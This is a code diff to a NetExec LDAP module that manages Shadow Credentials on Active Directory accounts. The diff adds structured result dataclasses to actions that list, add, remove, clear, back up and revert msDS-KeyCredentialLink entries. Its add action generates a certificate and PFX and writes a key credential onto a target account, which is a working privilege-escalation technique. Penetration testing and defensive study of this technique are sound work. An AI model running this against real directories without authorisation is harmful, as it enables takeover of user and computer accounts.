@@ -1,4 +1,5 @@
 import json
+from dataclasses import dataclass, field
 from pathlib import Path
 
 from cryptography.hazmat.primitives.serialization import NoEncryption
@@ -13,6 +14,7 @@ from impacket.ldap.ldap import MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE, LDAPSe
 from nxc.helpers.misc import CATEGORY
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.paths import NXC_PATH
+from nxc.playbooks.results import ActionResult, ResultStatus
 
 
 class NXCModule:
@@ -26,6 +28,27 @@ class NXCModule:
     description = "List, add, inspect, remove, clear, backup, or revert Shadow Credentials on a user or computer"
     supported_protocols = ["ldap"]
     category = CATEGORY.PRIVILEGE_ESCALATION
+
+    @dataclass
+    class KeyCredentialInfo:
+        device_id: str | None
+        creation_time: str | None = None
+
+    @dataclass
+    class ResultData:
+        action: str
+        target: str
+        target_dn: str | None = None
+        is_computer: bool = False
+        credentials: list = field(default_factory=list)  # list[KeyCredentialInfo] for list/info
+        device_id: str | None = None  # add/remove/info
+        pfx_path: str | None = None  # add (stringified Path)
+        json_path: str | None = None  # backup/revert (stringified Path)
+        modified: bool = False  # add/remove/clear/revert changed the directory
+        count: int = 0
+        error: str | None = None
+
+    result_type = ResultData
 
     def options(self, context, module_options):
         """
@@ -72,26 +95,38 @@ class NXCModule:
         resp_parsed = parse_result_attributes(resp)
         if not resp_parsed:
             context.log.fail(f"Account '{self.target}' was not found")
-            return
+            data = self.ResultData(action=self.action, target=self.target, error=f"Account '{self.target}' was not found")
+            return self.make_result(ResultStatus.FAILED, data)
 
         target_dn = resp_parsed[0]["distinguishedName"]
+        self.target_dn = target_dn
+        self.is_computer = "computer" in resp_parsed[0]["objectClass"]
         raw_values = resp_parsed[0].get("msDS-KeyCredentialLink", [])
         raw_values = raw_values if isinstance(raw_values, list) else [raw_values]
 
         if self.action == "list":
-            self.list(self.parse_credentials(raw_values))
+            return self.list(self.parse_credentials(raw_values))
         elif self.action == "add":
-            self.add(target_dn, "computer" in resp_parsed[0]["objectClass"])
+            return self.add(target_dn, self.is_computer)
         elif self.action == "info":
-            self.info(self.parse_credentials(raw_values))
+            return self.info(self.parse_credentials(raw_values))
         elif self.action == "remove":
-            self.remove(target_dn, self.parse_credentials(raw_values))
+            return self.remove(target_dn, self.parse_credentials(raw_values))
         elif self.action == "clear":
-            self.clear(target_dn, raw_values)
+            return self.clear(target_dn, raw_values)
         elif self.action == "backup":
-            self.backup(raw_values)
+            return self.backup(raw_values)
         elif self.action == "revert":
-            self.revert(target_dn)
+            return self.revert(target_dn)
+        return None
+
+    def make_result(self, status, data):
+        return ActionResult("ldap", self.name, self.connection.host, status, data)
+
+    def credential_info(self, credential):
+        device_id = credential.DeviceId.toFormatD().lower() if credential.DeviceId else None
+        creation_time = str(credential.CreationTime) if credential.CreationTime is not None else None
+        return self.KeyCredentialInfo(device_id=device_id, creation_time=creation_time)
 
     def parse_credentials(self, raw_values):
         credentials = []
@@ -116,15 +151,18 @@ class NXCModule:
         return None
 
     def list(self, credentials):
+        data = self.ResultData(action="list", target=self.target, target_dn=self.target_dn, is_computer=self.is_computer, credentials=[self.credential_info(credential) for _, credential in credentials], count=len(credentials))
         if not credentials:
             self.context.log.display(f"No KeyCredentials found on {self.target}")
-            return
+            return self.make_result(ResultStatus.NEGATIVE, data)
 
         self.context.log.success(f"Found {len(credentials)} KeyCredential(s) on {self.target}")
         for _, credential in credentials:
             self.context.log.highlight(f"Device ID: {credential.DeviceId.toFormatD().lower() if credential.DeviceId else '<missing>'} | Creation time: {credential.CreationTime}")
+        return self.make_result(ResultStatus.SUCCESS, data)
 
     def add(self, target_dn, is_computer):
+        data = self.ResultData(action="add", target=self.target, target_dn=target_dn, is_computer=is_computer)
         try:
             certificate = X509Certificate2(subject=self.target, keySize=2048, notBefore=-(40 * 365), notAfter=40 * 365)
             credential = KeyCredential.fromX509Certificate2(
@@ -139,18 +177,25 @@ class NXCModule:
             output_path = self.write_pfx(certificate, device_id)
         except Exception as e:
             self.context.log.fail(f"Failed to generate certificate and KeyCredential: {e}")
-            return
+            data.error = str(e)
+            return self.make_result(ResultStatus.FAILED, data)
 
+        data.device_id = device_id
+        data.pfx_path = str(output_path)
         try:
             # Add one value instead of replacing the complete multi-valued attribute.
             self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_ADD, [ldap_value])]})
         except LDAPSessionError as e:
             self.context.log.fail(f"Failed to add the KeyCredential: {e}")
             self.context.log.display(f"Generated PFX retained at {output_path}")
-            return
+            data.error = str(e)
+            return self.make_result(ResultStatus.FAILED, data)
 
         self.context.log.success(f"Added KeyCredential with device ID {device_id} to {self.target}")
         self.context.log.highlight(f"PFX: {output_path}")
+        data.modified = True
+        data.count = 1
+        return self.make_result(ResultStatus.SUCCESS, data)
 
     def write_pfx(self, certificate, device_id):
         output_dir = Path(NXC_PATH) / "modules" / "shadow-creds"
@@ -169,9 +214,11 @@ class NXCModule:
         return output_path
 
     def info(self, credentials):
+        data = self.ResultData(action="info", target=self.target, target_dn=self.target_dn, is_computer=self.is_computer, device_id=self.device_id)
         result = self.get_credential(credentials)
         if result is None:
-            return
+            data.error = f"No KeyCredential with device ID {self.device_id} was found on {self.target}"
+            return self.make_result(ResultStatus.FAILED, data)
 
         _, credential = result
         self.context.log.success(f"KeyCredential {self.device_id} on {self.target}")
@@ -195,11 +242,16 @@ class NXCModule:
             "Creation time": credential.CreationTime,
         }.items():
             self.context.log.highlight(f"{name:<17} {value}")
+        data.credentials = [self.credential_info(credential)]
+        data.count = 1
+        return self.make_result(ResultStatus.SUCCESS, data)
 
     def remove(self, target_dn, credentials):
+        data = self.ResultData(action="remove", target=self.target, target_dn=target_dn, is_computer=self.is_computer, device_id=self.device_id)
         result = self.get_credential(credentials)
         if result is None:
-            return
+            data.error = f"No KeyCredential with device ID {self.device_id} was found on {self.target}"
+            return self.make_result(ResultStatus.FAILED, data)
 
         raw_value, _ = result
         try:
@@ -207,30 +259,42 @@ class NXCModule:
             self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [raw_value])]})
         except LDAPSessionError as e:
             self.context.log.fail(f"Failed to remove the KeyCredential: {e}")
-            return
+            data.error = str(e)
+            return self.make_result(ResultStatus.FAILED, data)
 
         self.context.log.success(f"Removed KeyCredential {self.device_id} from {self.target}")
+        data.modified = True
+        data.count = 1
+        return self.make_result(ResultStatus.SUCCESS, data)
 
     def clear(self, target_dn, raw_values):
+        data = self.ResultData(action="clear", target=self.target, target_dn=target_dn, is_computer=self.is_computer, count=len(raw_values))
         if not raw_values:
             self.context.log.display(f"No KeyCredentials found on {self.target}")
-            return
+            return self.make_result(ResultStatus.NEGATIVE, data)
 
         try:
             self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [])]})
         except LDAPSessionError as e:
             self.context.log.fail(f"Failed to clear KeyCredentials: {e}")
-            return
+            data.error = str(e)
+            return self.make_result(ResultStatus.FAILED, data)
 
         self.context.log.success(f"Cleared all KeyCredentials from {self.target}")
+        data.modified = True
+        return self.make_result(ResultStatus.SUCCESS, data)
 
     def backup(self, raw_values):
+        data = self.ResultData(action="backup", target=self.target, target_dn=self.target_dn, is_computer=self.is_computer, count=len(raw_values))
         output_path = Path(self.jsonfile) if self.jsonfile else Path(NXC_PATH) / "modules" / "shadow-creds" / f"{self.target.rstrip('$')}.json"
         output_path.parent.mkdir(parents=True, exist_ok=True)
         output_path.write_text(json.dumps({"keyCredentials": raw_values}, indent=4), encoding="utf-8")
         self.context.log.success(f"Backed up {len(raw_values)} KeyCredential(s) from {self.target} to {output_path}")
+        data.json_path = str(output_path)
+        return self.make_result(ResultStatus.SUCCESS, data)
 
     def revert(self, target_dn):
+        data = self.ResultData(action="revert", target=self.target, target_dn=target_dn, is_computer=self.is_computer, json_path=str(self.jsonfile) if self.jsonfile else None)
         try:
             key_credentials = []
             for key_credential in json.loads(Path(self.jsonfile).read_text(encoding="utf-8"))["keyCredentials"]:
@@ -239,11 +303,16 @@ class NXCModule:
                 key_credentials.append(KeyCredential.fromDict(key_credential).toDNWithBinary().toString() if isinstance(key_credential, dict) else key_credential)
         except Exception as e:
             self.context.log.fail(f"Failed to read Shadow Credentials backup: {e}")
-            return
+            data.error = str(e)
+            return self.make_result(ResultStatus.FAILED, data)
 
         try:
             self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_REPLACE, key_credentials)]})
         except Exception as e:
             self.context.log.fail(f"Failed to revert Shadow Credentials: {e}")
-            return
+            data.error = str(e)
+            return self.make_result(ResultStatus.FAILED, data)
         self.context.log.success(f"Reverted {self.target} to {len(key_credentials)} backed-up KeyCredential(s)")
+        data.modified = True
+        data.count = len(key_credentials)
+        return self.make_result(ResultStatus.SUCCESS, data)
